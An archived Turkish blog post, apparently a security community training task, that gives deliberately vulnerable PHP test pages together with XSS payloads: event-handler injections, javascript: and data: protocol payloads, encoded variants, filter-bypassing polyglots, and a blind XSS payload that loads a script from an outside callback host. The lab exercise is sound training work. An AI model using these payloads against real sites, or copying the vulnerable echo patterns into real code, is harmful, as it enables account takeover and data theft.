# XSS Tipleri için Test Caseler

- **Source URL:** https://medium.com/@NadirSensoy/xss-tipleri-i%C3%A7in-test-caseler-ce006d2cd57f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240815145333/https://medium.com/@NadirSensoy/xss-tipleri-i%C3%A7in-test-caseler-ce006d2cd57f
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6976 (id 6976)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# XSS Tipleri için Test Caseler

Selamlar herkese, Gallipoli Topluluğunun 2. Task’iyle karşınızdayım. Blogun en altındaki linklerden Bana ve Gallipoli ye ulaşabilirsiniz.

Bu yazımda bir önceki yazımda temel olarak değinilmiş olan Reflected, Stored ve DOM based XSS ‘ten sonra daha ileri seviye XSS tipleri için hazırladığım test caselerini anlatacağım.

Hazırlamış olduğum caseleri denemek isterseniz. [Buyrunuz](https://revivalist.xyz/task2/task2.html) . Anlamak için okuyorsanız siteyi açın ve aşağıdaki yazıyı takip ederek beraber ilerleyin.

# İçerik:

1. Event Handlers
2. Protocols
3. Encoding & Obfuscation
4. Polyglots
5. Blind XSS

# Event Handlers

Bu kısımda bizden aynı sayfa içinde 1 tane input ve 7 output istendi. 5 adet user interaction gerektirmeyen, 2 tane user interaction gerektiren ve event handlerlar kullanılarak oluşturulacak ve aynı zamanda kullandığımız hiçbir payload başka bir outputta xss çalıştırmayacak şekilde tasarlamamız istendi. Son kısım diğer bölümlerde de mevcut ve en zorlandığımız kısım genel olarak eşsiz payloadlar üretmek oldu. Ve tabiki kodu buna göre hazırlamak.

Source Kod:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test Cases</title>
    <style>
        .output {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>XSS Test Cases</h1>
    <form method="GET">
        <label for="payload">Enter Payload:</label>
        <input type="text" id="payload" name="payload">
        <button type="submit">Submit</button>
    </form>
    <?php
    function sanitizeInput($input) {
        // JavaScript kelimesini ve < > işaretlerini içeren ifadeyi kontrol et
        if (preg_match('/javascript|<|>/', $input)) {
            // Yasaklı karakter kullanıldığında uyarı ver
            echo "Yasaklı karakter kullandınız.";
            return ''; // Güvenli olmayan girişi boş bir string ile değiştir
        }
        return $input;
    }
    if (isset($_GET['payload'])) {
        // Kullanıcı girdisini al ve temizle
        $payload = sanitizeInput($_GET['payload']);
        $decoded_payload = base64_decode($payload);
        // Güvenli hale getirilmiş çıktıyı kullan
        echo "<div class='output'><h2>Output for onload event (iframe)</h2><iframe src='{$payload}'></iframe></div>";
        echo "<div class='output'><h2>Output for onerror event (video)</h2><video src='{$payload}'></video></div>";
        echo "<div class='output'><h2>Output for onbegin event (svg animate)</h2><svg><animate attributeName='{$payload}' /></svg></div>";
        echo "<div class='output'><h2>Output for onfocus event (base64 encoded payload)</h2><input type='text' value='{$decoded_payload}'></div>";
        echo "<div class='output'><h2>Output for ontoggle event (details tag)</h2><details {$payload}>test</details></div>";
        echo "<div class='output'><h2>Output for onclick event (user interaction required)</h2><button value='{$payload}'>Click me</button></div>";
        echo "<div class='output'><h2>Output for oninput event (user interaction required)</h2><input type='text' placeholder='{$decoded_payload}'>";
    }
    ?>
</body>
</html>
```
İlk olarak farklı outputlarda çalışmasını önlemek için event handlerları ve tagleri araştırdım. Her event handler her tag içerisinde çalışmadığını farkettim. Mesela onload eventi video tagi içerisinde çalışmıyor bu sayede 1 payload birden fazla yerde xss çalıştıramayacak diye düşündüm. Ama 7 tane öyle eşsiz taglerde çalışan event handler bulamadım. Ve farklı yollar denedim. Geri kalanı payloadlarla beraber anlatalım.

`asdf' onload='alert(123) // birinci payload`
Buradaki payloadda tek tırnak ile src içerisinden çıkıyorum ve event handler ımı yazıyorum ardından syntax ı bozmamak için bir tane daha ‘ ekliyorum. Böylece bu kod çalıştığında onload eventi tetikleniyor ve xss patlıyor.

`asdf' onerror='alert(123) // ikinci paylaod`
Burada video taginin içerisinde src kısmına asdf yazıyorum öyle bir kaynak olmadığı için error üretecek bundan faydalanarak onerror event handler ını kullaıyorum ve error verdiğinde xss im patlıyor.

`asdf' onbegin='alert(123) // üçüncü payload`
Yine eşsiz olabilmesi için svg animate taginde kullanılabilen ve diğerlerinde kullanılamayan onbegin eventini kullandım. Tek tırnak kullanarak attributename içerisinden çıkıp onbegin event handler ını ekliyorum.

`YXNkZicgYXV0b2ZvY3VzIG9uZm9jdXM9J2FsZXJ0KDEyMyk= //dördüncü payload`
Artık eşsiz bir event handler bulamadığım için hileye kaçarak base64 ile beraber onfocus + auto focus event handlerlarını kullandım. Onfocus neredeyse her tag de çalışıyor o yüzden koda base64 decode ekledim bunun sayesinde diğerlerinde yorumlanmadan sadece bunda yorumlanıyor. auto focus ile de otomatik olarak focus alıyor ve user interactiona gerek kalmıyor.

`ontoggle=alert(1) open //beşinci payload`
Normalde toggle açılan bir tag ama sonuna open attribute unu eklediğimizde otomatik olarak açılıyor ve bunda da xss patlaması için user interaction gerektirmiyor. Bu ve yukarıdaki tüm caseler user interaction gerektirmeden çalışan xss örnekleri. Aşağıdaki 2 case user interaction gerektirecek dikkatinizi çekerim.

`asdf' onclick='alert(1) //altıncı payload`
Bu kısımda a taginin içerisinde bir link oluşturuyoruz ve click durumunda xss imiz çalışıyor.

`YXNkZicgb25pbnB1dD0nYWxlcnQoMSk= //yedinci payload`
Son olarak yine bir payload diğer outputta da çalışmaması için base64 decode ekledim.

Event Handlers kısmı bu kadardı. Protocollerden devam edelim.

# Protocols

Bu bölümde farklı tagler içinde farklı protokoller kullanarak XSS zaafiyetini tespit etmeye çalıştım ve 6 tane case hazırladım. Bu kısımda da bir üretilen bir payloadun diğer outputlarda çalışmaması gibi bir koşul var.

Source Kod

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test Cases</title>
</head>
<body>
    <form method="get">
        <label for="input">Input:</label>
        <input type="text" id="input" name="input" />
        <button type="submit">Submit</button>
    </form>
    <?php if (isset($_GET['input'])): ?>
        <?php $input = $_GET['input']; ?>
        <h2>Output 1: object tag with onload event</h2>
        <?php echo '<a href="javascript:'. $input .'">click pls</a>'; ?>
        <h2>Output 2: object tag with javascript protocol</h2>
        <?php echo '<iframe src="data:text/html,'. $input .'"></iframe>'; ?>
        <h2>Output 3: object tag with data protocol</h2>
        <?php echo '<object data="data:text/html,'. base64_decode($input) .'"></object>'; ?>
        <h2>Output 4: iframe tag with data protocol</h2>
        <?php echo '<embed src="data:text/html,'. base64_decode(base64_decode($input)) .'"></embed>'; ?>
        <h2>Output 5: iframe tag with javascript protocol</h2>
        <?php echo '<img src=x onerror="javascript:' . base64_decode($input) . '"></img>'; ?>
        <h2>Output 6: script tag with inline JavaScript</h2>
        <?php echo '<svg onload="javascript:' . base64_decode(base64_decode($input)) . '"></svg>'; 
    <?php endif; ?>
</body>
</html>
```
javascript ve data:text/html protokollerini kullandım. Burada farkettiğim nokta şu oldu iframe embed object gibi tagler dışında data:text/html protokolünü kullanamadım. Browserın güvenlik önlemlerinden biri olarak karşımıza çıkıyor.

`alert(123)`
a taginin içerisinde Javascript protokolü hazır vardı ben sadece yapması gerekenin alert üretmesi olduğunu yazdım normal hayatta rastgelmeniz çok zor.

`<script>alert(1)</script>`
Hazır olarak data:text/html var tek yapmamız gereken en basit payload u girmek.

`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
Eşsiz olması için Base64 encoding ile destekledim.

`UEhOamNtbHdkRDVoYkdWeWRDZ3hLVHd2YzJOeWFYQjBQZz09`
Embed tagi içerisinde data text html+ double.base64 encode kullanılan payload.

`YWxlcnQoMTIzKQ==`
javascript protokolü + base64 encode un beraber kullanıldığı durum.

`WVd4bGNuUW9NVEl6S1E9PQ==`
javascript protokolü + double.base64 encode un beraber kullanıldığı durum.

# Encoding & Obfuscation

Burada 3 farklı encoding metodunu ele aldım. Benden istenilen taskte birer tane base64, url encode ve html encode ile atlatılan, 3 tane de iki tanesinin birleşimiyle atlatılabilen case yani (Base64 + HTML Encode, Base64 + URL Encode, HTML + URL Encode) şeklinde toplam 6 tane case hazırladım.

Source Kod

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Test Cases</title>
</head>
<body>
    <header>
        <h1>XSS Test Cases</h1>
    </header>
    <div>
        <form method="get">
            <label for="input">Input:</label>
            <input type="text" id="input" name="input" />
            <button type="submit">Submit</button>
        </form>
        <?php if (isset($_GET['input'])): ?>
            <?php
            $input = $_GET['input'];
            
            $base64Decoded = base64_decode($input, true);
            $urlDecoded = urldecode($input);
            $htmlDecoded = htmlspecialchars_decode($input);
            $base64HtmlDecoded = htmlspecialchars_decode(base64_decode($input, true));
            $base64UrlDecoded = urldecode(base64_decode($input, true));
            $htmlUrlDecoded = htmlspecialchars_decode(urldecode($input));
            if ($htmlUrlDecoded == $urlDecoded) {
                $htmlUrlDecoded = null ;}
            if ($base64Decoded == $base64UrlDecoded ) {
                $base64UrlDecoded = null ;}
                
            if ($base64Decoded == $base64HtmlDecoded ) {
                $base64HtmlDecoded = null ;}
            if ($urlDecoded == $htmlUrlDecoded ) {
                $htmlUrlDecoded = null ;}
            
            if ($input == $urlDecoded ) {
                $urlDecoded = null ;}
            if ($input == $htmlDecoded ) {
                $htmlDecoded = null ;}
            if ($urlDecoded == $htmlUrlDecoded ) {
                $htmlUrlDecoded = null ;}
            if ($htmlDecoded == $htmlUrlDecoded ) {
                $htmlUrlDecoded = null ;}
            ?>
            <h2>Base64 Encoding</h2>
            <?php echo $base64Decoded; ?>
            <h2>URL Encoding</h2>
            <?php echo $urlDecoded; ?>
            <h2>HTML Encoding</h2>
            <?php echo $htmlDecoded; ?>
            <h2>Base64 + HTML Encoding</h2>
            <?php echo $base64HtmlDecoded; ?>
            <h2>Base64 + URL Encoding</h2>
            <?php echo $base64UrlDecoded; ?>
            <h2>HTML + URL Encoding</h2>
            <?php echo $htmlUrlDecoded; ?>
        <?php endif; ?>
    </div>
</body>
</html>
```
Html kodunun yukarısındaki if koşullarına ihtiyacımız var çünkü html decode ve url decode işlemini browser otomatik olarak kendisi yapıyor. Bundan dolayı girdiğimiz bir input browserın yaptığı decode işleminden dolayı diğer outputlarda da çalışıyor. Buna önlem olarak yukarıdaki koşulları ekledim. Koşullarda da kısaca girilen input değeri yapılan decode işleminden sonra değişmiyorsa null değerine eşitledim. Sorun ortadan kalktı.

`PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+`
Base64 Encoded

`%3Cscript%3Ealert%28123%29%3C%2Fscript%3E`
Url Encoded

`<script>alert(123)</script>`
Html Encoded

`Jmx0O3NjcmlwdCZndDthbGVydCgxMjMpJmx0Oy9zY3JpcHQmZ3Q7`
Html + Base64 Encoded Payload

`JTNDc2NyaXB0JTNFYWxlcnQlMjgxMjMlMjklM0MlMkZzY3JpcHQlM0U=`
Url + Base64 Encoded Payload

`%26lt%3Bscript%26gt%3Balert%28123%29%26lt%3B%2Fscript%26gt%3B`
Html + Url Encoded Payload

Ve hepsinin asıl değeri \<script>alert(123)\</script>. Böylece bu kısımda bitiyor.

# Polyglot

Polyglot payloadlar birden çok xss payloadunun birleşimi ile oluşurlar ve bir inputtaki filtreleri daha hızlı atlatmamızı sağlayabilirler. Bu kısımda 5 adet polyglot payloadumuz var ve 1 input 5 outputumuz var. Payloadların polyglot olmasına rağmen 1 input sadece 1 tane outputta xss çalıştırıyor. Burada polyglotların engellenmesi için filtreleme kullanıldı.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Test Cases</title>
</head>
<body>
    <header>
        <h1>XSS Test Cases</h1>
    </header>
    <div>
        <form method="get">
            <label for="input">Input:</label>
            <input type="text" id="input" name="input" />
            <button type="submit">Submit</button>
        </form>
        <?php if (isset($_GET['input'])): ?>
            <?php
            $input = $_GET['input'];
            ?>
            <h2>Polyglot 1</h2>
            <?php
             function filter1($input) {
                $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
                $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
                $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
                $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
                $filtered = str_replace(['iframe', 'eval', 'onload', 'img', 'onclick', 'onmouseout', 'ondblclick'], '', $filtered);
                return $filtered;
              }
              function echo1($str) {
                echo filter1($str);
              }
                echo "<p>" .  htmlspecialchars(echo1($input)) . "</p>";
            ?>
            <h2>Polyglot 2</h2>
            <?php
            function filter2($input) {
                $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
                $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
                $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
                $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
                $filtered = str_replace(['iframe', 'eval', 'onclick', 'onmouseover', 'img', 'textarea', 'onclick',  'onmouseout', 'ondblclick'], '', $filtered);
                return $filtered;
            }
                echo "<script>var str =\" " .  filter2($input) . "\";</script>";
            ?>
            <h2>Polyglot 3</h2>
            <?php
            function filter3($input) {
                $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
                $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
                $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
                $filtered = str_replace(['expression('], '', $filtered);
                $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'onmouseout', 'ondblclick', 'onclick'], '', $filtered);
                return $filtered;
            }
            echo "<input type='text' placeholder='input a text' value='" . filter3($input) . "'>";
            ?>
            <h2>Polyglot 4</h2>
            <?php
            function filter4($input) {
                $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
                $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
                $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
                $filtered = str_replace(['expression('], '', $filtered);
                $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'ondblclick'], '', $filtered);
                return $filtered;
            }
            echo "<a href=\"" . filter4($input) . "\">set link</a>";
            ?>
            <h2>Polyglot 5</h2>
            
            <?php
            function filter5($input) {
                $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
                $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
                $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
                $filtered = str_replace(['expression('], '', $filtered);
                $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'onclick'], '', $filtered);
                return $filtered;
            }
            echo "add comment line";
            echo "<!--" . filter5($input) . "-->";
            ?>
        <?php endif; ?>
    </div>
</body>
</html>
```
Burada polyglotların engellenmesi için filtreleme kullanıldı. Polyglot içerisindeki sadece bir payload için filtreleme yapılmadı yani o filtreleme yapılmayan payload buradaki örneklerde xss i çalıştıran payload olarak karşımıza çıkıyor.

``javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg style="border:1px solid black" onload=/*<html/*/onmouseover=alert()//>``
**Çalışan Kısım:** Payload daki `onmouseover=alert()` kısmı filtrelerden geçerek çalışabilir. Çünkü `onmouseover` event handler'ı `filter1` fonksiyonu tarafından temizlenmedi.

``javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><<svg/*/ onload=alert()//>``
**Çalışan Kısım:** Payload 2'deki `onload=alert()` kısmı `filter2` fonksiyonunda tam olarak temizlenmedi.

``javascript:/*"/*'/*`/*\"/**/ oninput=alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>-->``
**Çalışan Kısım:** Payload 3'teki `oninput=alert()` kısmı `filter3` fonksiyonunda temizlenmedi.

``jaVasCript:/*-/*`/*\`/*'/*"/*/(/* */ onclick=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe///>\x3e``
**Çalışan Kısım:** Payload 4'teki `onclick=alert()` kısmı `filter4` fonksiyonunda temizlenmedi.

``jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */)//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/ondblclick=alert()//>``
**Çalışan Kısım:** Payload 5'teki `ondblclick=alert()` kısmı `filter5` fonksiyonunda temizlenmemiş olabilir. Bu da `ondblclick` event handler'ının filtrelenmediğini gösterir.

# Blind XSS

Blind XSS bizim inputumuz bizim ulaşamadığımız başka bir sayfada yazdırıldığı xss türüdür. Örneğin bir uygulamada bir hata raporlama kısmı var. Ve bu sadece developerlar tarafından görülebilen bir sayafaya düşüyor gibi düşünebilirsiniz. Bu xss türünü tespit edebilmek için xss payloadunun içerisine, bizim görebileceğimiz bir yere istek yaptırmasını sağlıyoruz.

Bunun için kullanılan bazı siteler mevcut. xsshunter bxss hunter gibi siteler var ama mantık yukarıdaki gibi kendi sunucunuza da istek yaptırabilirsiniz.

Bizim senaryomuzda iki adet php sayfası var birinicisi user.php ikincisi ise admin.php sayfası var.

User Source Kod

```
<?php
$servername = "localhost";
$username = "db username ismi";
$password = "db şifresi";
$dbname = "db ismi";
// MySQL bağlantısını oluştur
$conn = new mysqli($servername, $username, $password, $dbname);
// Bağlantıyı kontrol et
if ($conn->connect_error) {
    die("Bağlantı hatası: " . $conn->connect_error);
}
// Kullanıcıdan gelen inputu al
if (isset($_GET['input'])) {
    $input = $_GET['input'];
    // Inputu veritabanına kaydet
    $stmt = $conn->prepare("INSERT INTO xss_data (payload) VALUES (?)");
    $stmt->bind_param("s", $input);
    $stmt->execute();
    $stmt->close();
    echo "Input kaydedildi!";
}
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blind XSS Test</title>
</head>
<body>
    <h1>Blind XSS Test</h1>
    <form method="get">
        <label for="input">Input:</label>
        <input type="text" id="input" name="input" />
        <button type="submit">Submit</button>
    </form>
</body>
</html>
```
Bu user sayfası içerisinde bir input alanı var ve yazdığımız kod bu inputu alıp database e kaydediyor.

Admin Source Kod

```
<?php
$servername = "localhost";
$username = "yeni_kullanici";
$password = "gizli_sifre";
$dbname = "blind";
// MySQL bağlantısını oluştur
$conn = new mysqli($servername, $username, $password, $dbname);
// Bağlantıyı kontrol et
if ($conn->connect_error) {
    die("Bağlantı hatası: " . $conn->connect_error);
}
// Veritabanından en son kaydedilen inputu al
$sql = "SELECT payload FROM xss_data ORDER BY id DESC LIMIT 1";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    // Veriyi çek ve ekrana yazdır
    $row = $result->fetch_assoc();
    echo "Son girilen input: " . $row['payload'];
} else {
    echo "Henüz bir input girilmedi.";
}
$conn->close();
?>
```
Admin sayfasının da tek işi o database e kaydedilen o değeri çekip sayfaya yapıştırmak.

Burada bizim girdiğimiz paylaod şu şekilde :

`"><script src=https://revivalist.bxss.in></script>`
Ben bxss hunter sitesini kullanıyorum. Sizde kullanmak için bir hesap oluşturmanız gerekiyor. Benimkini kullanırsanız bulduğunuz blind xss ler bana gelir affetmem :D

User kısmından bu payloadu yazıyorum. User sayfasında başka bir şey görünmüyor. Ve admin olan kişi admin sayfasını açtığı zaman bizim payloadumuz çalışıyor ve bizim bxsshunter daki hesabımıza bildirim geliyor. Şu şekilde:

Ve uzun yolun sonuna geldik. Okuduğunuz için teşekkür ederim. Eğer ki hatamı gördüyseniz bana bildirebilirsiniz.

Bu benim linkedin profilim [https://www.linkedin.com/in/nadirsensoy/](https://www.linkedin.com/in/nadirsensoy/)

Ve bunlar da Gallipoli Topluluğumuzun Linkleri

Telegram Linki: [https://lnkd.in/d\_7vKdKv](https://lnkd.in/d_7vKdKv)

Discord Linki: [https://lnkd.in/dqF-kKtE](https://lnkd.in/dqF-kKtE)

Web Sitemiz: [https://www.gallipoli.xyz](https://www.gallipoli.xyz/)

Linkedin Sayfamız: [https://lnkd.in/dTg8KKBe](https://lnkd.in/dTg8KKBe)

Twitter (X) Sayfamız: [https://x.com/Gallipolixyz](https://x.com/Gallipolixyz)

Bir sonraki blogda görüşmek üzere :)
